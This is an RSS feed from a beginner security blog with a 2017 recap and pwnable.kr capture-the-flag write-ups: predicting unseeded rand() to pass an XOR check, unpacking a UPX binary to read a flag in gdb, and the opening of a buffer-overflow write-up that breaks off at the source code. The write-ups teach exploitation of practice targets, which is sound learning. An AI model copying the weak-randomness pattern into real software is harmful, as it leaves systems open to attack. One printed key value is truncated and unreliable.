<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Root Network Security</title>
    <description>Beginners's journey through the world of security, programming and system administration. In love with GNU/Linux and cryptography.</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    
      <item>
        <title>Summary of 2017</title>
        <description>&lt;p&gt;Another year, another summary. I’m kind of sad that this year is coming to an end, as 2017 made me develop my skills more than every other year summed together. But I have plans, big plans for the future, which some of them, I’m going to briefly introduce in this post.&lt;/p&gt;

&lt;h1 id=&quot;the-past&quot;&gt;The past&lt;/h1&gt;

&lt;p&gt;In this year I have written so far a small number of &lt;strong&gt;&lt;em&gt;46 posts&lt;/em&gt;&lt;/strong&gt;, which is about the double of what I have written in 2016. But the speed of making these posts have increased, on average about 5 hours. That add’s up to &lt;strong&gt;&lt;em&gt;230 hours&lt;/em&gt;&lt;/strong&gt;, which is, for me especially, quite insane.&lt;/p&gt;

&lt;p&gt;But I love it, writing these posts help me concentrate on learning, they make great way to strengthen what I know and amazing opportunity to find out about different topics, that I would not discover in any different way. In addition, they make great library of your own findings, that you can easily come back to in the future.&lt;/p&gt;

&lt;p&gt;Apart from that I participated in a few CTF’s, but the most memorable one was &lt;strong&gt;&lt;em&gt;PicoCTF&lt;/em&gt;&lt;/strong&gt;, where me and my team were able to finish around &lt;strong&gt;&lt;em&gt;300th&lt;/em&gt;&lt;/strong&gt; place. That was big motivation to keep learning, especially when I found out that my favourite challenges were the ones connected with crypto. To my astonishment, write-ups from some of these challenges are the most read posts on this blog, still vistied even that so much time have passed.&lt;/p&gt;

&lt;p&gt;There were also some failures like &lt;strong&gt;&lt;em&gt;GoogleCTF&lt;/em&gt;&lt;/strong&gt;, and many others which were simply to hard to grasp. But where is failure, there is knowledge from the mistakes. I’m looking forward to the ones in 2018.&lt;/p&gt;

&lt;p&gt;In the last 2 months I started learning &lt;strong&gt;&lt;em&gt;C&lt;/em&gt;&lt;/strong&gt;, simply as a part of the university course, but I quickly decided that the better way to learn about it is to write your own programs, and that’s where I started writing &lt;strong&gt;&lt;em&gt;brainfuck&lt;/em&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;em&gt;chip-8&lt;/em&gt;&lt;/strong&gt; interpreters. I can say that they were one of the biggest programming projects and I’m proud of the result.&lt;/p&gt;

&lt;h1 id=&quot;the-future&quot;&gt;The future&lt;/h1&gt;

&lt;p&gt;What comes with the future?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Write-ups on machines from &lt;strong&gt;&lt;em&gt;Vulnhub&lt;/em&gt;&lt;/strong&gt;, and the ones from retired section of &lt;strong&gt;&lt;em&gt;Hackthebox&lt;/em&gt;&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;Dive deeper into the reverse engineering ocean, with parts on low-level programming. That’s gonna be fun :D&lt;/li&gt;
  &lt;li&gt;Spend more time programming while not learning about netsec. Making projects that would sum up to the portfolio, probably in &lt;strong&gt;&lt;em&gt;C/C++&lt;/em&gt;&lt;/strong&gt; or &lt;strong&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/strong&gt; for netsec related programming.&lt;/li&gt;
  &lt;li&gt;Learn about blockchain, resources are waiting but there’s no time to read.&lt;/li&gt;
  &lt;li&gt;Maybe try luck in CCNA certification offered by university?&lt;/li&gt;
  &lt;li&gt;Come back with retribution on some of the CTFs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;And many, many more.&lt;/p&gt;

&lt;p&gt;In the last words I would like to thank my girlfriend for the biggest support that I could ever receive in keeping this project up and running. It would be very hard without this. And of course thanks to you guys for another amazing year in this community. Looking at how many people may be learning from this blog makes me want to write more and more with every new post.&lt;/p&gt;
</description>
        <pubDate>Sat, 16 Dec 2017 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/summary-of-2017/</link>
        <guid isPermaLink="true">http://localhost:4000/summary-of-2017/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - random</title>
        <description>&lt;p&gt;Welcome to another challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt;. This time we’re going to work on flaws made while generating pseudo random numbers.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Daddy, teach me how to use random value in programming!

ssh random@pwnable.kr -p2222 (pw:guest)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Firstly let’s connect with &lt;strong&gt;&lt;em&gt;ssh&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;main:~ &amp;gt; ssh random@pwnable.kr -p2222
random@pwnable.kr's password:
 ____  __    __  ____    ____  ____   _        ___      __  _  ____  
|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \
|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \
|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|

- Site admin : daehee87.kr@gmail.com
- IRC : irc.netgarage.org:6667 / #pwnable.kr
- Simply type &quot;irssi&quot; command to join IRC now
- files under /tmp can be erased anytime. make your directory under /tmp
- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
Last login: Sun Dec 10 09:21:25 2017 from 143.248.133.220
random@ubuntu:~$ ls -la
total 40
drwxr-x---  5 root       random 4096 Oct 23  2016 .
drwxr-xr-x 80 root       root   4096 Jan 11  2017 ..
d---------  2 root       root   4096 Jun 30  2014 .bash_history
-r--r-----  1 random_pwn root     49 Jun 30  2014 flag
dr-xr-xr-x  2 root       root   4096 Aug 20  2014 .irssi
drwxr-xr-x  2 root       root   4096 Oct 23  2016 .pwntools-cache
-r-sr-x---  1 random_pwn random 8538 Jun 30  2014 random
-rw-r--r--  1 root       root    301 Jun 30  2014 random.c&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we’re ready to look at the source code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// random value!
&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Good!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/cat flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Wrong, maybe you should try 2^32 cases.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If &lt;code class=&quot;highlighter-rouge&quot;&gt;srand&lt;/code&gt; is not called, &lt;code class=&quot;highlighter-rouge&quot;&gt;rand&lt;/code&gt; acts as if &lt;code class=&quot;highlighter-rouge&quot;&gt;srand(1)&lt;/code&gt; has been called. That’s not good for a security of the program.&lt;/p&gt;

&lt;p&gt;We know that it should generate the same number everytime we start the program. But in order to find what number is generated, we’ll have to create small code in &lt;strong&gt;&lt;em&gt;C&lt;/em&gt;&lt;/strong&gt;. As in the rules, we can do it in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-basg&quot; data-lang=&quot;basg&quot;&gt;random@ubuntu:/tmp$ mkdir random_test
random@ubuntu:/tmp$ cd random_test
random@ubuntu:/tmp/random_test$ touch test.c
random@ubuntu:/tmp/random_test$ vi test.c
#include &amp;lt;stdio.h&amp;gt;

int main(){
        unsigned int random;
        random = rand();

        printf(&quot;%d\n&quot;, random);
        return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We can now compile it, run and our number should be generated.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;random@ubuntu:/tmp/random_test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc test.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;test.c: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘main’:
test.c:5:18: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘rand’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
         random &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; rand&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                  ^
random@ubuntu:/tmp/random_test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;random@ubuntu:/tmp/random_test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test
1804289383&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we have the number. As we also know that &lt;code class=&quot;highlighter-rouge&quot;&gt;(key ^ random) == 0xdeadbeef&lt;/code&gt;, we can reverse the XOR operation to get the desired key. It will look like this &lt;code class=&quot;highlighter-rouge&quot;&gt;random ^ 0xdeadbeef = key&lt;/code&gt;, and then we’ll be able to get the flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;  
&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;python&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Oct&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2017&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;7.2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1804289383&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;303923085&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we have the key.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;random@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./random
3039230856
Good!
Mommy, I thought libc random is unpredictable...&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

</description>
        <pubDate>Sun, 10 Dec 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-random/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-random/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - flag</title>
        <description>&lt;p&gt;In order to keep this challenge streak alive, I decide to play with another one from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called &lt;strong&gt;&lt;em&gt;flag&lt;/em&gt;&lt;/strong&gt;. This time our task is purely reverse enginnering, since we’re only given a binary, with no source code, no listening applications or ssh connections.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Papa brought me a packed present! let's open it.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I started analyzing by running a &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; command on the binary.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~/programming/pwnable.kr % file flag
flag: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, stripped
w3ndige@main ~/programming/pwnable.kr % ./flag
I will malloc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; and strcpy the flag there. take it.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It shows us that it’s a &lt;strong&gt;&lt;em&gt;stripped&lt;/em&gt;&lt;/strong&gt; binary. Running it only prints a message for us, telling how the code works  using high level interpretation.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % strings flag
&lt;span class=&quot;nv&quot;&gt;$Info&lt;/span&gt;: This file is packed with the UPX executable packer http://upx.sf.net &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$Id&lt;/span&gt;: UPX 3.08 Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996-2011 the UPX Team. All Rights Reserved. &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After running &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt; tool, I’ve noticed these lines - it’s packed with &lt;strong&gt;&lt;em&gt;UPX packer&lt;/em&gt;&lt;/strong&gt;. We can use &lt;code class=&quot;highlighter-rouge&quot;&gt;upx&lt;/code&gt; tool to unpack the binary into a more readable one. Let’s take a look.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;1 w3ndige@main ~/programming/pwnable.kr % upx &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; flag &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; flag_               :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
                       Ultimate Packer &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;eXecutables
                          Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1996 - 2017
UPX 3.94        Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser   May 12th 2017

        File size         Ratio      Format      Name
   &lt;span class=&quot;nt&quot;&gt;--------------------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;   &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
    883745 &amp;lt;-    335288   37.94%   linux/amd64   flag_

Unpacked 1 file.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, now we’re ready to analyze it with &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~/programming/pwnable.kr % gdb flag_
GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GDB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 8.0.1
For &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Type &lt;span class=&quot;s2&quot;&gt;&quot;apropos word&quot;&lt;/span&gt; to search &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commands related to &lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;...
Reading symbols from flag_...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disass main
Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
   0x0000000000401164 &amp;lt;+0&amp;gt;:	push   rbp
   0x0000000000401165 &amp;lt;+1&amp;gt;:	mov    rbp,rsp
   0x0000000000401168 &amp;lt;+4&amp;gt;:	sub    rsp,0x10
   0x000000000040116c &amp;lt;+8&amp;gt;:	mov    edi,0x496658
   0x0000000000401171 &amp;lt;+13&amp;gt;:	call   0x402080 &amp;lt;puts&amp;gt;
   0x0000000000401176 &amp;lt;+18&amp;gt;:	mov    edi,0x64
   0x000000000040117b &amp;lt;+23&amp;gt;:	call   0x4099d0 &amp;lt;malloc&amp;gt;
   0x0000000000401180 &amp;lt;+28&amp;gt;:	mov    QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8],rax
   0x0000000000401184 &amp;lt;+32&amp;gt;:	mov    rdx,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rip+0x2c0ee5]        &lt;span class=&quot;c&quot;&gt;# 0x6c2070 &amp;lt;flag&amp;gt;&lt;/span&gt;
   0x000000000040118b &amp;lt;+39&amp;gt;:	mov    rax,QWORD PTR &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-0x8]
   0x000000000040118f &amp;lt;+43&amp;gt;:	mov    rsi,rdx
   0x0000000000401192 &amp;lt;+46&amp;gt;:	mov    rdi,rax
   0x0000000000401195 &amp;lt;+49&amp;gt;:	call   0x400320
   0x000000000040119a &amp;lt;+54&amp;gt;:	mov    eax,0x0
   0x000000000040119f &amp;lt;+59&amp;gt;:	leave  
   0x00000000004011a0 &amp;lt;+60&amp;gt;:	ret    
End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here we have an assembly code of &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; function. One particular thing that brought my notice is at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+32&lt;/code&gt;, where something is passed into &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt;. Let’s set a breakpoint line after, at &lt;code class=&quot;highlighter-rouge&quot;&gt;mov+39&lt;/code&gt; and check what &lt;code class=&quot;highlighter-rouge&quot;&gt;rdx&lt;/code&gt; is storing.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x000000000040118b
Breakpoint 1 at 0x40118b
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
Starting program: /home/w3ndige/programming/pwnable.kr/flag_
I will malloc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; and strcpy the flag there. take it.

Breakpoint 1, 0x000000000040118b &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;
0x496628:	&lt;span class=&quot;s2&quot;&gt;&quot;UPX...? sounds like a delivery service :)&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, a flag! But after a little bit of playing with it, I’ve found another place where it’s possible to find a flag. Take a look at &lt;code class=&quot;highlighter-rouge&quot;&gt;main+49&lt;/code&gt; and see what’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x000000000040119a
Breakpoint 1 at 0x40119a
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
Starting program: /home/w3ndige/programming/pwnable.kr/flag_
I will malloc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; and strcpy the flag there. take it.

Breakpoint 1, 0x000000000040119a &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;nv&quot;&gt;$eax&lt;/span&gt;
0x6c96b0:	&lt;span class=&quot;s2&quot;&gt;&quot;UPX...? sounds like a delivery service :)&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here we have the flag, once again.&lt;/p&gt;
</description>
        <pubDate>Sun, 26 Nov 2017 08:00:00 +0000</pubDate>
        <link>http://localhost:4000/pwnable.kr-flag/</link>
        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-flag/</guid>
      </item>
    
      <item>
        <title>Pwnable.kr - bof</title>
        <description>&lt;p&gt;Another challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; will show us how to perform a simple buffer overflow attack.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This time we’re going to download the source code and the binary from the webpage. After that we’re ready to analyze whatever this challenge brings to us.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
